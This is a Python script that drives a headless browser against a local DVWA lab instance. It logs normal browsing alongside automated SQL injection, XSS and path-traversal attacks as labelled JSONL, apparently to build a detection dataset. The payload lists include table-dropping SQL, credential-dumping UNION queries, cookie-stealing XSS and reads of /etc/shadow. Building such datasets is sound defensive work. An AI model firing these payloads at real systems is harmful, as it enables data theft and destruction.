"""
dvwa_collector.py
=================
Automated traffic collector for DVWA using Playwright.
Captures both normal and attack traffic.

Usage:
    python traffic_logger/dvwa_collector.py
"""

import json
import hashlib
import asyncio
from datetime import datetime, timezone
from pathlib import Path
from playwright.async_api import async_playwright

ROOT    = Path(__file__).parent.parent
LOG_DIR = ROOT / "traffic_data" / "raw"
LOG_DIR.mkdir(parents=True, exist_ok=True)

DVWA_URL = "http://localhost:8081"

# ── SQLi payloads ─────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1 UNION SELECT user,password FROM users--",
    "'; DROP TABLE users;--",
    "admin'--",
    "' OR 'x'='x",
    "1' AND 1=1--",
    "' UNION SELECT null,null--",
    "1; SELECT * FROM users--",
    "' OR 1=1#",
    "\" OR \"\"=\"",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "1' AND sleep(3)--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' WAITFOR DELAY '0:0:3'--",
]

# ── XSS payloads ──────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "<script>document.cookie</script>",
    "<img src=1 onerror=alert(document.cookie)>",
    "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<Script>alert(1)</Script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<<script>alert(1);//<</script>",
]

# ── Path Traversal payloads ───────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../proc/self/environ",
    "../../../../../../etc/passwd%00",
    "..\\..\\..\\windows\\system32",
    "/%2e%2e/%2e%2e/etc/passwd",
]

def get_log_file(label: str) -> Path:
    date = datetime.now(timezone.utc).strftime("%Y%m%d")
    return LOG_DIR / f"dvwa_{date}.jsonl"

def log_record(record: dict):
    with open(get_log_file(record['label']), "a") as f:
        f.write(json.dumps(record) + "\n")

def make_record(method, path, query, body, headers, label, source="dvwa"):
    return {
        "timestamp":    datetime.now(timezone.utc).isoformat(),
        "source_app":   source,
        "label":        label,
        "method":       method,
        "path":         path,
        "query_string": query,
        "full_path":    path + (f"?{query}" if query else ""),
        "headers":      headers,
        "cookie":       headers.get("cookie", ""),
        "body":         body,
        "body_length":  len(body),
        "request_id":   hashlib.md5(f"{path}{query}{body}".encode()).hexdigest()[:12],
    }

async def collect(page, label: str):
    """Intercept and log all requests from the page."""
    def handle_request(request):
        try:
            url     = request.url.replace(DVWA_URL, "")
            parts   = url.split("?", 1)
            path    = parts[0]
            query   = parts[1] if len(parts) > 1 else ""
            method  = request.method
            headers = dict(request.headers)
            body    = request.post_data or ""

            # Skip static assets
            skip = [".js", ".css", ".png", ".jpg", ".ico",
                    ".gif", ".woff", ".map", ".svg"]
            if any(path.endswith(s) for s in skip):
                return

            record = make_record(method, path, query, body, headers, label)
            log_record(record)
        except Exception:
            pass

    page.on("request", handle_request)

async def login(page):
    """Login to DVWA."""
    await page.goto(f"{DVWA_URL}/login.php")
    await page.fill("input[name='username']", "admin")
    await page.fill("input[name='password']", "password")
    await page.click("input[type='submit']")
    await page.wait_for_load_state("networkidle")

    # Set security to low
    await page.goto(f"{DVWA_URL}/security.php")
    await page.wait_for_load_state("networkidle")
    try:
        await page.select_option("select[name='security']", "low", timeout=5000)
        await page.click("input[type='submit']")
        await page.wait_for_load_state("networkidle")
    except Exception:
        pass
    print("  ✓ Logged in, security set to low")

async def collect_normal(page, count=500):
    """Browse DVWA normally."""
    print(f"\n[NORMAL] Collecting {count} normal requests...")
    await collect(page, "NORMAL")

    normal_pages = [
        "/index.php",
        "/instructions.php",
        "/about.php",
        "/vulnerabilities/brute/",
        "/vulnerabilities/exec/",
        "/vulnerabilities/fi/",
        "/vulnerabilities/sqli/",
        "/vulnerabilities/sqli_blind/",
        "/vulnerabilities/upload/",
        "/vulnerabilities/xss_d/",
        "/vulnerabilities/xss_r/",
        "/vulnerabilities/xss_s/",
        "/vulnerabilities/csrf/",
        "/security.php",
        "/phpinfo.php",
    ]

    collected = 0
    while collected < count:
        for path in normal_pages:
            await page.goto(f"{DVWA_URL}{path}")
            await page.wait_for_load_state("networkidle")
            collected += 1
            if collected % 50 == 0:
                print(f"  → {collected} normal requests collected")
            if collected >= count:
                break

    print(f"  ✓ Normal collection done: {collected} requests")

async def collect_sqli(page):
    """Fire SQLi payloads against DVWA."""
    print(f"\n[SQLI] Collecting {len(SQLI_PAYLOADS)} SQLi attacks...")
    await collect(page, "SQLI")

    await page.goto(f"{DVWA_URL}/vulnerabilities/sqli/")
    await page.wait_for_load_state("networkidle")

    for payload in SQLI_PAYLOADS:
        try:
            await page.fill("input[name='id']", payload)
            await page.click("input[type='submit']")
            await page.wait_for_load_state("networkidle")
        except Exception:
            pass

    # Also try blind SQLi
    await page.goto(f"{DVWA_URL}/vulnerabilities/sqli_blind/")
    for payload in SQLI_PAYLOADS[:10]:
        try:
            await page.fill("input[name='id']", payload)
            await page.click("input[type='submit']")
            await page.wait_for_load_state("networkidle")
        except Exception:
            pass

    print(f"  ✓ SQLi collection done")

async def collect_xss(page):
    """Fire XSS payloads against DVWA."""
    print(f"\n[XSS] Collecting {len(XSS_PAYLOADS)} XSS attacks...")
    await collect(page, "XSS")

    # Reflected XSS
    await page.goto(f"{DVWA_URL}/vulnerabilities/xss_r/")
    for payload in XSS_PAYLOADS:
        try:
            await page.fill("input[name='name']", payload)
            await page.click("input[type='submit']")
            await page.wait_for_load_state("networkidle")
        except Exception:
            pass

    # Stored XSS
    await page.goto(f"{DVWA_URL}/vulnerabilities/xss_s/")
    for payload in XSS_PAYLOADS[:8]:
        try:
            await page.fill("input[name='txtName']",    payload[:50])
            await page.fill("textarea[name='mtxMessage']", payload)
            await page.click("input[type='submit']")
            await page.wait_for_load_state("networkidle")
        except Exception:
            pass

    print(f"  ✓ XSS collection done")

async def collect_traversal(page):
    """Fire Path Traversal payloads against DVWA."""
    print(f"\n[PATH_TRAVERSAL] Collecting {len(TRAVERSAL_PAYLOADS)} traversal attacks...")
    await collect(page, "PATH_TRAVERSAL")

    await page.goto(f"{DVWA_URL}/vulnerabilities/fi/")
    for payload in TRAVERSAL_PAYLOADS:
        try:
            url = f"{DVWA_URL}/vulnerabilities/fi/?page={payload}"
            await page.goto(url)
            await page.wait_for_load_state("networkidle")
        except Exception:
            pass

    print(f"  ✓ Path Traversal collection done")

async def main():
    print("\n" + "="*60)
    print("  DVWA Automated Traffic Collector")
    print("="*60)

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page    = await browser.new_page()

        # Login once
        await login(page)

        # Collect normal traffic
        await collect_normal(page, count=500)

        # Re-login for attacks (session may expire)
        await login(page)
        await collect_sqli(page)

        await login(page)
        await collect_xss(page)

        await login(page)
        await collect_traversal(page)

        await browser.close()

    # Summary
    log_file = get_log_file("NORMAL")
    print(f"\n{'='*60}")
    print(f"  ✓ Collection complete!")
    print(f"  ✓ Log: {log_file.parent}")
    print("="*60)

    # Count results
    import subprocess
    result = subprocess.run(
        ["wc", "-l"] + list(LOG_DIR.glob("dvwa_*.jsonl")),
        capture_output=True, text=True
    )
    print(result.stdout)

if __name__ == "__main__":
    asyncio.run(main())
